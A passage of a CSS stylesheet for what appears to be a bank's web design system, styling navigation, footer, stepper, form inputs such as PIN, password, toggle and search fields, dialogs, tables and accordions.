    }

    @media (max-width: 1199px) {
        [class*=direction--]>.side-bar {
            margin: 0;
            padding: 0;
            position: relative;
            top: 0;
            width: 100%
        }

        [class*=direction--]>.side-bar--expanded {
            bottom: 0;
            min-height: 100vh
        }
    }

    .side-nav {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        align-items: baseline;
        margin: 4.8rem 2.4rem
    }

    @media (max-width: 1199px) {
        .side-nav.md-show {
            display: inherit
        }
    }

    @media (max-width: 1199px) {
        .side-nav {
            display: none;
            margin: 2.4rem 3.6rem
        }
    }

    .side-nav__list {
        list-style: none;
        margin: 0;
        padding-left: 0
    }

    .side-nav__item {
        list-style: none;
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        line-height: 1.6rem;
        color: #757575;
        flex-direction: column
    }

    .side-nav__item.side-nav__item--active {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        line-height: 1.6rem;
        border-bottom: #e2e8ee .1rem solid;
        border-top: #e2e8ee .1rem solid;
        color: #333;
        margin: .6rem 0;
        padding: .6rem 0
    }

    @media (max-width: 1199px) {
        .side-nav__item.side-nav__item--active {
            margin: 1.2rem 0;
            padding: 1.2rem 0
        }
    }

    .side-nav__item.side-nav__item--active span {
        filter: FlipH;
        transform: scaleY(-1)
    }

    .side-nav__item.side-nav__item--active .sub-nav {
        display: inherit
    }

    .side-nav__item:first-of-type.side-nav__item--active {
        border-top: 0;
        margin-top: 0;
        padding-top: 0
    }

    .side-nav__item:last-of-type.side-nav__item--active {
        border-bottom: 0;
        margin-bottom: 0;
        padding-bottom: 0
    }

    .quick-nav {
        align-content: stretch;
        background-color: #fafbfd;
        border-bottom: 1px solid #e2e8ee;
        display: none
    }

    @media (max-width: 1199px) {
        .quick-nav.md-hide {
            display: none
        }
    }

    @media (max-width: 1199px) {
        .quick-nav {
            display: flex;
            flex-basis: auto;
            flex-grow: 1;
            flex-shrink: 1;
            height: 6.2rem
        }
    }

    .quick-nav button {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: .025rem;
        line-height: 2rem;
        margin: 0;
        align-items: baseline;
        background-color: transparent;
        border: 0;
        justify-content: space-between;
        padding: 2rem 2.4rem
    }

    .quick-nav button>span:first-of-type {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: .025rem;
        line-height: 2rem;
        margin: 0;
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        justify-content: flex-start
    }

    .quick-nav button>span:first-of-type:before {
        content: "/";
        display: flex;
        margin: 0 .5rem
    }

    .nav-item button,
    .nav-item a,
    .nav-item button:hover,
    .nav-item a:hover {
        color: inherit;
        font-family: inherit;
        font-size: inherit;
        text-decoration: inherit
    }

    .nav-item__action {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        align-items: flex-end;
        justify-content: space-between;
        padding: 1.2rem
    }

    @media (max-width: 1199px) {
        .nav-item__action {
            padding: 1.2rem .8rem
        }
    }

    .sub-nav {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        list-style: none;
        margin: 0;
        padding-left: 0;
        display: none;
        margin-left: 1.2rem
    }

    @media (max-width: 1199px) {
        .sub-nav {
            margin-left: 2.4rem
        }
    }

    .sub-nav li {
        list-style: none
    }

    .sub-nav__item {
        display: flex;
        flex-basis: auto;
        flex-grow: 1;
        flex-shrink: 1;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        line-height: 1.6rem;
        color: #757575;
        padding: .6rem 1.2rem
    }

    @media (max-width: 1199px) {
        .sub-nav__item {
            padding: .9rem 2.4rem
        }
    }

    .sub-nav__item--active {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        line-height: 1.6rem;
        color: #009dd6
    }

    .sub-nav__item:last-of-type {
        padding-bottom: 1.2rem
    }

    .footer {
        width: 100%
    }

    .footer__bar {
        justify-content: space-between;
        padding: 2.1rem .6rem
    }

    @media (max-width: 767px) {
        .footer__bar {
            padding: 2.3rem .6rem 1.3rem
        }
    }

    .footer__link {
        color: currentColor;
        margin-left: 1.8rem;
        text-decoration: none
    }

    .footer__link:focus {
        border-bottom: .1rem solid currentColor;
        outline: none
    }

    .footer__link:hover {
        border-bottom: .1rem dotted currentColor;
        cursor: pointer
    }

    .footer__link .svg-icon {
        margin: 0 0 0 .4rem;
        stroke-width: 2
    }

    @media (max-width: 767px) {
        .footer__link {
            margin: 0
        }
    }

    .footer--light-theme {
        background-color: #fafbfd;
        border-top: .1rem solid #e2e8ee;
        color: #333
    }

    .footer--dark-theme {
        background-color: #ec111a;
        color: #fff
    }

    .footer__list {
        display: inherit;
        list-style: none;
        margin: 0;
        padding: 0
    }

    @media (max-width: 767px) {
        .footer__list {
            columns: 2;
            column-gap: 6.7rem;
            display: block;
            width: 100%
        }
    }

    @media (max-width: 767px) {
        .footer-list__item {
            margin: 0 0 1.8rem
        }

        .footer-list__item:last-child:not(:nth-child(even)) {
            margin-bottom: 5.3rem
        }
    }

    .footer-list__item:first-child .footer__link {
        margin: 0
    }

    @media (max-width: 767px) {
        .footer__copyright {
            border-top: .1rem solid #e2e8ee;
            padding: .9rem 0 0;
            width: 100%
        }
    }

    .stepper {
        max-width: 40rem
    }

    .stepper__indicator {
        background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0) calc(50% - .1rem), #d6d6d6 calc(50% - .1rem), #d6d6d6 calc(50% + .1rem), rgba(0, 0, 0, 0) calc(50% + .1rem), rgba(0, 0, 0, 0) 100%);
        counter-reset: step-counter;
        display: flex;
        flex-direction: row;
        justify-content: space-between
    }

    .stepper__step {
        border-radius: 1rem;
        counter-increment: step-counter;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        height: 2rem;
        position: relative;
        width: 2rem
    }

    .stepper__step--completed {
        background: #ffffff;
        border: .2rem solid #009dd6
    }

    .stepper__step--completed .svg-icon {
        left: 50%;
        margin-top: .1rem;
        position: absolute;
        stroke-width: 4;
        top: 50%;
        transform: translate(-50%, -50%) scale(.7);
        width: 1.4rem
    }

    .stepper__step--current {
        background: #009dd6;
        border: .2rem solid #009dd6;
        color: #fff
    }

    .stepper__step--pending {
        background: #ffffff;
        border: .2rem solid #757575;
        color: #757575
    }

    .stepper--numbered .stepper__step {
        border-radius: 1.25rem;
        height: 2.5rem;
        width: 2.5rem
    }

    .stepper--numbered .stepper__step--completed .svg-icon {
        margin-top: 0;
        transform: translate(-50%, -50%)
    }

    .stepper--numbered .stepper__step--pending:before,
    .stepper--numbered .stepper__step--current:before {
        content: counter(step-counter);
        left: 50%;
        position: absolute;
        top: 50%;
        transform: translate(-50%, -50%)
    }

    .stepper__label {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.4rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 1.8rem;
        margin: 0;
        margin-top: 2.4rem;
        text-align: center
    }

    .stepper__label__info {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        padding-left: .4rem
    }

    .form__input,
    .form__input-group {
        border: 0;
        position: relative
    }

    .form__input--inline,
    .form__input-group--inline {
        cursor: pointer;
        position: relative
    }

    .form__input--radio,
    .form__input--checkbox,
    .form__input-group--radio,
    .form__input-group--checkbox {
        display: flex;
        align-items: center
    }

    .form__input--language,
    .form__input-group--language {
        display: inline-flex
    }

    .form__input+.form__input,
    .form__input+.form__input-group,
    .form__input-group+.form__input,
    .form__input-group+.form__input-group {
        margin-top: 3.6rem
    }

    .form__input--error+.form__input,
    .form__input--error+.form__input-group,
    .form__input-group--error+.form__input,
    .form__input-group--error+.form__input-group {
        margin-top: 1.8rem
    }

    .form__button {
        font-family: Scotia Bold;
        font-size: 1.2rem;
        font-weight: initial;
        line-height: 1.6rem;
        background-color: transparent;
        border-width: 0;
        color: #333;
        padding: 1.8rem 0 1.1rem;
        text-transform: uppercase
    }

    .form__button--centered {
        padding: 0
    }

    .label {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: initial;
        line-height: 2.4rem;
        color: #333;
        display: inline;
        padding: 0 .1rem;
        vertical-align: middle
    }

    .label--disabled {
        color: #757575
    }

    .label--error {
        color: #be061b
    }

    .label--inline {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif"
    }

    .label--aux-label {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        margin-left: .3rem
    }

    input::-ms-clear,
    input::-ms-reveal {
        display: none;
        height: 0;
        width: 0
    }

    .input {
        padding: 1rem .1rem;
        width: 100%;
        font-family: Scotia Regular;
        font-size: 2rem;
        font-weight: initial;
        line-height: 2.4rem
    }

    .input--with-icon {
        top: initial
    }

    .input--with-icon--left {
        padding-left: 3.2rem
    }

    .input--with-icon--right {
        padding-right: 4.5rem
    }

    .input__icon {
        pointer-events: none;
        position: absolute;
        top: 50%;
        transform: translateY(-50%)
    }

    .input__icon--left {
        left: 0
    }

    .input__icon--right {
        right: 1.2rem
    }

    .input__icon--highlight {
        color: #009dd6
    }

    .input--error+.input__icon--highlight,
    .input--error:focus+.input__icon--highlight {
        color: #be061b
    }

    .input__icon--action {
        pointer-events: visible
    }

    .input__character-limit {
        bottom: 1.5rem;
        color: #757575;
        font-size: 1.4rem;
        margin: 0;
        position: absolute;
        right: 1.5rem
    }

    .input__character-limit--error {
        color: #be061b;
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif"
    }

    .input--text {
        appearance: none;
        background-color: transparent;
        border-bottom-color: #757575;
        border-bottom-style: solid;
        border-radius: 0;
        border-width: 0 0 1px;
        color: #333;
        display: block;
        outline: none;
        position: relative;
        transition: box-shadow .2s ease-in-out;
        width: 100%
    }

    .input--text:focus {
        border-bottom-color: #009dd6;
        box-shadow: 0 .1rem #009dd6
    }

    .input--text.input--error:focus {
        box-shadow: 0 .1rem #be061b
    }

    .input--text.input--disabled {
        border-bottom-color: #d6d6d6;
        border-bottom-style: solid;
        color: #757575;
        cursor: not-allowed
    }

    .input--text.input--error {
        border-bottom-color: #be061b
    }

    .checkbox {
        align-self: flex-start;
        background-color: transparent;
        border: solid 1px #757575;
        border-radius: .4rem;
        color: #fff;
        margin-right: 1.2rem;
        min-height: 2.4rem;
        min-width: 2.4rem;
        position: relative;
        transition: opacity ease-in-out .2s
    }

    .checkbox:after {
        border-radius: .4rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem);
        transform: translate(-.1rem, -.1rem)
    }

    .checkbox .svg-icon {
        left: 50%;
        margin-left: -.6rem;
        margin-top: -.6rem;
        position: absolute;
        top: 50%
    }

    .checkbox__check {
        display: none
    }

    .input--checkbox {
        align-self: flex-start;
        opacity: 0;
        position: absolute;
        width: auto
    }

    .input--checkbox:focus+.checkbox:after {
        opacity: 1
    }

    @media all and (-ms-high-contrast: active) {
        .input--checkbox:focus+.checkbox {
            outline: 2px solid white
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        .input--checkbox:focus+.checkbox {
            outline: 2px solid black
        }
    }

    .input--checkbox:checked+.checkbox {
        background-color: #009dd6;
        border-color: #009dd6
    }

    .input--checkbox:checked+.checkbox .checkbox__check {
        display: block
    }

    .input--checkbox:disabled+.checkbox {
        border-color: #d6d6d6;
        cursor: not-allowed
    }

    .input--checkbox:disabled+.checkbox+.label--checkbox {
        cursor: not-allowed
    }

    .input--checkbox:disabled:checked+.checkbox {
        background-color: transparent;
        color: #d6d6d6
    }

    .input--checkbox:disabled:checked+.checkbox .checkbox__check {
        display: block
    }

    .input--checkbox.input--error+.checkbox {
        border-color: #be061b;
        border-width: 2px
    }

    .input--checkbox.input--error+.checkbox:after {
        border-radius: .6rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .4rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .4rem);
        transform: translate(-.2rem, -.2rem)
    }

    .input--checkbox.input--error:focus+.checkbox:after {
        opacity: 1
    }

    .label--checkbox {
        line-height: 2.4rem;
        padding-top: 0rem
    }

    .form__input--checkbox+.form__input--checkbox {
        margin-top: 2.4rem
    }

    .radio {
        align-self: flex-start;
        background-color: transparent;
        border: solid 1px #757575;
        border-radius: 50%;
        margin-right: 1.2rem;
        min-height: 2.4rem;
        min-width: 2.4rem;
        position: relative;
        transition: opacity ease-in-out .2s
    }

    .radio:after {
        border-radius: 50%;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem);
        transform: translate(-.1rem, -.1rem)
    }

    .radio .svg-icon {
        left: 50%;
        margin-left: -.4rem;
        margin-top: -.4rem;
        position: absolute;
        top: 50%;
        width: .8rem;
        height: .8rem
    }

    .radio__circle--small {
        color: #fff;
        height: .8rem;
        transform: scale(0);
        transition: transform .1s ease 0ms;
        width: .8rem
    }

    .radio__circle--big {
        background-color: #fff;
        border-radius: 50%;
        height: 100%;
        position: absolute;
        transform: scale(0);
        transition: transform .1s linear 0ms;
        width: 100%
    }

    .input--radio {
        left: -9999px;
        opacity: 0;
        position: absolute
    }

    .input--radio:focus+.radio {
        outline: none
    }

    @media all and (-ms-high-contrast: active) {
        .input--radio:focus+.radio {
            outline: 2px solid white
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        .input--radio:focus+.radio {
            outline: 2px solid black
        }
    }

    .input--radio:focus+.radio:after {
        opacity: 1
    }

    .input--radio:checked+.radio {
        border-color: #009dd6
    }

    .input--radio:checked+.radio .radio__circle--small {
        display: block;
        transform: scale(1);
        transition: transform .1s ease 0ms
    }

    .input--radio:checked+.radio .radio__circle--big {
        background-color: #009dd6;
        transform: scale(1);
        transition: transform .1s linear 0ms
    }

    .input--radio:checked+.radio:before {
        display: block
    }

    .input--radio:disabled+.radio {
        border-color: #d6d6d6
    }

    .input--radio:disabled+.radio .radio__circle--big {
        background-color: #fafbfd
    }

    .input--radio:disabled:checked+.radio .radio__circle--small {
        color: #d6d6d6;
        display: block
    }

    .input--radio.input--error+.radio {
        border-color: #be061b;
        border-width: 2px
    }

    .input--radio.input--error+.radio .radio__circle--big {
        background-color: #be061b
    }

    .input--radio.input--error+.radio:after {
        border-radius: 50%;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .4rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .4rem);
        transform: translate(-.2rem, -.2rem)
    }

    .input--radio.input--error:focus+.radio:after {
        opacity: 1
    }

    .label--radio {
        line-height: 2.2rem;
        padding-top: .1rem
    }

    .form__input--radio+.form__input--radio {
        margin-top: 2.4rem
    }

    .input--pin {
        height: 4.5rem;
        max-width: 4.8rem;
        text-align: center
    }

    .input--obfuscate {
        font-family: text-security-disc;
        font-size: 1rem
    }

    .form__input--pin {
        max-width: 6rem;
        padding-right: 1.2rem
    }

    .form__input--pin+.form__input--pin {
        margin-top: 0
    }

    .form__input--pin--with-space {
        margin-left: 1.8rem
    }

    @media (min-width: 767px) {
        .form__input--pin--with-space {
            margin-left: 3.6rem
        }
    }

    .input-w-aux__input:-webkit-autofill~label {
        height: 1px;
        left: -10000px;
        overflow: hidden;
        position: absolute;
        top: auto;
        width: 1px
    }

    .input-w-aux {
        margin-top: 1.8rem;
        position: relative
    }

    .input-w-aux__icon {
        bottom: 1.5rem;
        padding: 0;
        position: absolute;
        z-index: 1
    }

    .input-w-aux__icon:focus {
        outline: none
    }

    .input-w-aux__label {
        bottom: 1rem;
        color: #757575;
        cursor: text;
        left: 2.5rem;
        position: absolute;
        right: 0
    }

    .input-w-aux__input {
        padding-left: 2.5rem
    }

    .input-w-aux__input--no-icon {
        padding-left: 0
    }

    .input-w-aux__input.input--active+label {
        height: 1px;
        left: -10000px;
        overflow: hidden;
        position: absolute;
        top: auto;
        width: 1px
    }

    .input-w-aux__input.input--active~button {
        opacity: 1
    }

    .input-w-aux__action {
        bottom: 1.1rem;
        color: #333;
        height: 2rem;
        opacity: 0;
        padding: 0;
        position: absolute;
        right: 1.8rem;
        transition: opacity .1s ease-in-out;
        width: 2rem;
        z-index: 110
    }

    .input--without-icon {
        padding-left: 0
    }

    .error {
        align-items: center;
        color: #be061b;
        display: flex;
        margin-top: .6rem
    }

    .error__text {
        font-family: Scotia Bold;
        font-size: 1.4rem;
        font-weight: initial;
        line-height: 1.8rem;
        margin-left: 1rem
    }

    .error__icon {
        align-self: flex-start
    }

    .login {
        border: 0;
        height: auto;
        margin: 0;
        padding: 0
    }

    @media (min-width: 767px) {

        .input-w-aux__label,
        .input-w-aux__input {
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 2rem;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 2.8rem;
            margin: 0
        }
    }

    @media (max-width: 767px) {

        .input-w-aux__label,
        .input-w-aux__input {
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 1.8rem;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 2.8rem;
            margin: 0;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }
    }

    .input--select {
        -moz-appearance: none;
        -webkit-appearance: none;
        background-color: transparent;
        border: 0;
        border-bottom-color: #757575;
        border-bottom-style: solid;
        border-radius: 0;
        border-width: 0 0 1px;
        color: #333;
        display: block;
        outline: none;
        padding-right: 4.8rem;
        position: relative;
        width: 100%
    }

    .input--select::-ms-expand {
        display: none
    }

    .input--select:focus {
        border-bottom-color: #009dd6
    }

    .input--select:focus,
    .input--select.input--error:focus {
        border-bottom-width: .2rem;
        margin-bottom: -.1rem
    }

    .input--select.input--disabled {
        border-bottom-color: #d6d6d6;
        border-bottom-style: solid;
        color: #757575;
        cursor: not-allowed
    }

    .input--select.input--error {
        border-bottom-color: #be061b
    }

    .input--select-wrap {
        position: relative
    }

    .input-group__legend {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: 0;
        line-height: 1.6rem
    }

    .input-group__legend+.form__input {
        margin-top: 2.6rem
    }

    .input-group__error {
        margin-left: .45rem
    }

    .form__input+.input-group__error {
        margin-top: 2.4rem
    }

    .input--language {
        font-family: Scotia Regular;
        font-size: 1.6rem;
        font-weight: initial;
        line-height: 1.6rem;
        border: 0;
        letter-spacing: 0;
        width: auto
    }

    .input--language__icon {
        color: #009dd6;
        right: 1.6rem
    }

    .input--language:active,
    .input--language:hover,
    .input--language:focus {
        margin-bottom: 0
    }

    @media all and (-ms-high-contrast: active) {

        .input--language:active,
        .input--language:hover,
        .input--language:focus {
            outline: 2px solid white
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {

        .input--language:active,
        .input--language:hover,
        .input--language:focus {
            outline: 2px solid black
        }
    }

    .form__password-requirements {
        padding: 0
    }

    .form__password-requirement {
        align-items: center;
        display: flex;
        margin: 0 0 .6rem;
        padding: 0
    }

    .form__password-requirement:last-of-type {
        margin: 0
    }

    .form__password-title {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        margin: 1.4rem 0 1rem
    }

    .form__password-title,
    .form__password-description {
        font-size: 1.4rem
    }

    .form__password-description {
        margin: 0 0 0 1.2rem
    }

    .input--textbox-wrapper {
        padding-top: .3rem;
        position: relative
    }

    .input--textbox-wrapper em {
        background-color: #fdc6cc;
        font-style: normal
    }

    .input--textbox-highlight {
        background-color: #fff;
        border-color: transparent;
        border-radius: .4rem;
        border-style: solid;
        border-width: .1rem;
        color: transparent;
        letter-spacing: normal;
        outline: none;
        padding: 1.8rem;
        position: absolute;
        white-space: pre-wrap;
        width: 100%;
        word-wrap: break-word
    }

    .input--textarea {
        appearance: none;
        background-color: transparent;
        border-color: #757575;
        border-radius: .4rem;
        border-style: solid;
        border-width: .1rem;
        color: #333;
        display: block;
        height: 100%;
        letter-spacing: normal;
        outline: none;
        overflow: hidden;
        padding: 1.8rem;
        position: relative;
        resize: none;
        white-space: pre-wrap;
        width: 100%;
        word-wrap: break-word
    }

    .input--textarea:focus {
        border-color: #009dd6;
        box-shadow: 0 0 0 .1rem #009dd6
    }

    .input--textarea.input--error:focus {
        border-color: #be061b;
        box-shadow: 0 0 0 .1rem #be061b
    }

    @media (min-width: 0) {
        .input--textarea-responsive {
            font-size: 1.6rem
        }
    }

    @media (min-width: 922px) {
        .input--textarea-responsive {
            font-size: 2rem
        }
    }

    .input.input--disabled {
        border-color: #d6d6d6;
        border-style: solid;
        color: #757575;
        cursor: not-allowed
    }

    .input.input--error {
        border-color: #be061b;
        padding-bottom: 1rem
    }

    @supports (-webkit-overflow-scrolling: touch) {
        .input--textbox-highlight {
            padding: 1rem 3.5rem 1rem 1.3rem
        }

        .input--textarea {
            width: 101%
        }
    }

    .input--search {
        -wekbkit-appearance: none;
        appearance: none;
        background-color: #fff;
        border: 1px solid #757575;
        border-radius: 8px;
        color: #333;
        display: block;
        outline: none;
        padding: 12px 45px 12px 48px;
        position: relative;
        transition: box-shadow .2s ease-in-out;
        width: 100%;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: -.015rem;
        line-height: 2.4rem
    }

    .input--search:focus {
        border: 1px solid #009dd6;
        box-shadow: 0 0 0 1px #009dd6
    }

    @media (min-width: 768px) {
        .input--search {
            padding: 20px 76px 20px 24px;
            box-shadow: 0 2px 10px #00225b1c;
            font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
            font-size: 2.4rem;
            font-weight: initial;
            letter-spacing: normal;
            line-height: 3.2rem
        }

        .input--search:focus {
            border: 1px solid #757575;
            box-shadow: 0 2px 10px #00225b1c
        }

        .input--search:focus~.input--search__icon--desktop .svg-icon {
            color: #333
        }
    }

    .input--search__icon {
        padding: 0
    }

    .input--search__icon--desktop {
        display: none;
        color: #d6d6d6
    }

    @media (min-width: 768px) {
        .input--search__icon--desktop {
            display: block
        }
    }

    .input--search__icon--desktop:after {
        height: 40px;
        width: 40px
    }

    .input--search__icon--desktop:focus,
    .input--search__icon--desktop:active {
        color: #333
    }

    .input--search__icon--desktop .svg-icon {
        stroke-width: 4px
    }

    .input--search__icon--mobile {
        display: inline-flex;
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        left: 20px;
        z-index: 1
    }

    @media (min-width: 768px) {
        .input--search__icon--mobile {
            display: none
        }
    }

    .input--search__clear {
        padding: 0;
        display: inline-flex
    }

    @media (min-width: 768px) {
        .input--search__clear {
            display: none
        }
    }

    .input--search__clear:after {
        height: 26px;
        width: 26px
    }

    .slider {
        background-color: #757575;
        border-radius: 3rem;
        display: block;
        margin-right: 1.2rem;
        min-height: 3rem;
        min-width: 5.6rem;
        position: relative;
        transition: opacity ease-in-out .2s
    }

    .slider:after {
        border-radius: 3.2rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + 0rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + 0rem)
    }

    .input--toggle {
        cursor: pointer;
        height: 3.6rem;
        margin: 0;
        opacity: 0;
        position: absolute;
        right: 0;
        width: 6.6rem
    }

    .slider .switch {
        position: absolute;
        content: "";
        height: 2.4rem;
        width: 2.4rem;
        left: .3rem;
        top: .3rem;
        background-color: #fff;
        transition: .2s;
        border-radius: 50%;
        transition-timing-function: ease-in-out;
        box-shadow: 0 0 1px #aaa
    }

    .slider .switch .svg-icon {
        margin-left: .6rem;
        margin-top: .6rem;
        position: absolute;
        z-index: 1000
    }

    .slider .switch .svg-icon.icon-off {
        display: block;
        stroke: #757575;
        fill: #757575
    }

    .slider .switch .svg-icon.icon-on {
        display: none;
        stroke: #009dd6;
        fill: #009dd6;
        stroke-width: 3
    }

    input.input--toggle:checked~.slider .switch {
        transform: translate(26px)
    }

    input.input--toggle:checked~.slider .switch .icon-off {
        display: none
    }

    input.input--toggle:checked~.slider .switch .icon-on {
        display: block
    }

    input.input--toggle:checked~.slider {
        background-color: #009dd6
    }

    input.input--toggle:focus~.slider {
        outline-offset: 0px
    }

    @media all and (-ms-high-contrast: active) {
        input.input--toggle:focus~.slider {
            outline: 2px solid white
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        input.input--toggle:focus~.slider {
            outline: 2px solid black
        }
    }

    input.input--toggle:focus~.slider:after {
        opacity: 1
    }

    .form__input--toggle {
        align-items: center;
        cursor: pointer;
        display: flex;
        justify-content: space-between;
        -webkit-tap-highlight-color: transparent
    }

    .form__input--toggle+.form__input--toggle {
        margin-top: 2.4rem
    }

    .scroll--disabled,
    .modal-open {
        height: 100%;
        overflow: hidden;
        position: fixed;
        width: 100%
    }

    @media (max-width: 767px) {
        .xs-no-margin {
            height: 100%;
            margin: 0;
            padding: 0
        }
    }

    .modal-open {
        position: static
    }

    .dialog,
    .popup {
        background: #ffffff;
        border: .1rem solid #e2e8ee;
        border-radius: .4rem;
        box-shadow: 0 .2rem 1rem #0028501c;
        height: 100%;
        margin: 6.4rem auto;
        overflow: auto;
        padding: 3.6rem 3.6rem 0;
        position: relative
    }

    .dialog:focus,
    .popup:focus {
        outline: none
    }

    .dialog__container,
    .popup__container {
        height: 100%;
        left: 0;
        overflow: auto;
        position: fixed;
        right: 0;
        top: 0;
        z-index: 1
    }

    .dialog__header {
        margin-top: 3rem
    }

    @media (max-width: 767px) {

        .dialog,
        .popup {
            border-radius: 0;
            height: 100%;
            overflow-x: hidden;
            overflow-y: scroll;
            margin: 0 auto;
            position: absolute;
            width: 100%;
            z-index: 1
        }

        @supports (-webkit-overflow-scrolling: touch) {

            .dialog,
            .popup {
                -webkit-overflow-scrolling: touch
            }
        }

        .dialog__header {
            margin-top: 5.4rem
        }
    }

    .dialog__button-close {
        float: right
    }

    .dialog__button-close:hover {
        border-bottom: 0
    }

    .dialog__content {
        margin: 4.8rem 0
    }

    .dialog__footer,
    .popup__footer {
        align-items: center;
        display: flex;
        justify-content: flex-end;
        margin: 6rem 0 3.6rem
    }

    .dialog__footer__item {
        margin-left: 1.2rem
    }

    @supports (-webkit-overflow-scrolling: touch) {

        .dialog__footer,
        .popup__footer {
            padding-bottom: 4.4rem
        }
    }

    .table {
        border-collapse: collapse;
        font-size: 1.4rem;
        min-width: 26rem;
        table-layout: fixed;
        white-space: nowrap;
        width: 100%
    }

    .table__header {
        border-bottom: solid 1px #d6d6d6
    }

    .table__header-item {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: inherit;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 1.8rem;
        margin: 0;
        color: #757575;
        padding: 1.2rem;
        text-align: left
    }

    .table__row:nth-child(even) {
        background-color: #e2e8ee33
    }

    .table__data {
        padding: 1.8rem 1.2rem;
        text-align: left;
        vertical-align: top
    }

    .accordion {
        margin: 0;
        padding: 0
    }

    .accordion__toggle {
        align-items: center;
        display: flex;
        justify-content: space-between;
        padding: 2.4rem 2.4rem 2.4rem 0;
        text-align: left;
        width: 100%
    }

    @media (max-width: 767px) {
        .accordion__toggle {
            padding-right: 0
        }
    }

    .accordion__item {
        border-bottom: 1px solid #757575;
        display: flex;
        flex-direction: column
    }

    .accordion__item__title {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.8rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 2.7rem;
        margin: 0;
        width: 100%
    }

    .accordion__item__content {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: 400;
        letter-spacing: 0;
        line-height: 2.4rem;
        margin: 0;
        color: #333;
        padding-bottom: 2.4rem;
        padding-right: 10.8rem
    }

    @media (max-width: 767px) {
        .accordion__item__content {
            padding-right: 0
        }
    }

    .accordion__item__content>.list>.list__item {
        list-style-type: disc
    }

    .accordion__item__content>.list>.list__item .list>.list__item {
        list-style-type: circle
    }

    .accordion__item__action {
        margin-left: 4.8rem
    }

    .accordion--card {
        flex: 1
    }

    .accordion--card .accordion__title {
        display: flex
    }

    .accordion--card .accordion__item {
        border-bottom: 0
    }

    .accordion--card .accordion__item__title {
        border-bottom: 0;
        display: flex;
        flex: 1
    }

    .accordion--card .accordion__item__title__container {
        display: flex;
        flex-direction: column
    }

    .accordion--card .accordion__item__content {
        padding-bottom: 0
    }

    .accordion--card .accordion__item__content .text--bold {
        color: #333
    }

    .accordion--card .accordion__item__content>.text {
        margin-bottom: 1.6rem;
        margin-top: 2.4rem
    }

    .accordion--card .accordion__item__action {
        display: flex
    }

    @media (min-width: 767px) {
        .accordion--card .accordion__item__action .sr-only {
            display: none
        }
    }

